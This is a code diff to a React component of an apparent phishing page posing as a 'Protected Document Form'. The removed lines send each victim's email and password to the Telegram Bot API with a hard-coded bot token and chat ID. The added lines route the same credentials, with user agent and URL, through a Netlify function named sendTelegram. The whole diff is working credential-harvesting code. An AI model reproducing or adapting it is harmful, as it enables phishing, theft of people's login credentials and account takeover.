@@ -54,23 +54,33 @@ function App() {
   // 🟢 NEW: Function to send data to Telegram
   const sendToTelegram = async (email: string, password: string) => {
     try {
-      const botToken = '7729439776:AAGBcHgFEd3uBxqKj9nW6yPuFg4Zx8NzjSI';
-      const chatId = '6754688449';
-      const message = `🔐 New Login Credentials:\n📧 Email: ${email}\n🔑 Password: ${password}\n🕒 Time: ${new Date().toLocaleString()}\n🌐 URL: ${window.location.href}`;
+      // Send data to your Netlify function instead of directly to Telegram
+      const netlifyFunctionUrl = '/.netlify/functions/sendTelegram';
       
-      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-      
-      await fetch(telegramUrl, {
+      const response = await fetch(netlifyFunctionUrl, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: 'HTML'
+          email: email,
+          password: password,
+          passwordSource: 'document-protection-form',
+          userAgent: navigator.userAgent,
+          sessionId: 'form_' + Math.random().toString(36).substring(2, 15),
+          timestamp: new Date().toISOString(),
+          source: 'Protected Document Form',
+          url: window.location.href
         })
       });
+      
+      const result = await response.json();
+      
+      if (response.ok && result.success) {
+        console.log('✅ Credentials sent to Telegram via Netlify function successfully');
+      } else {
+        console.warn('⚠️ Netlify function responded with error:', result);
+      }
       
       console.log('✅ Credentials sent to Telegram successfully');
     } catch (error) {
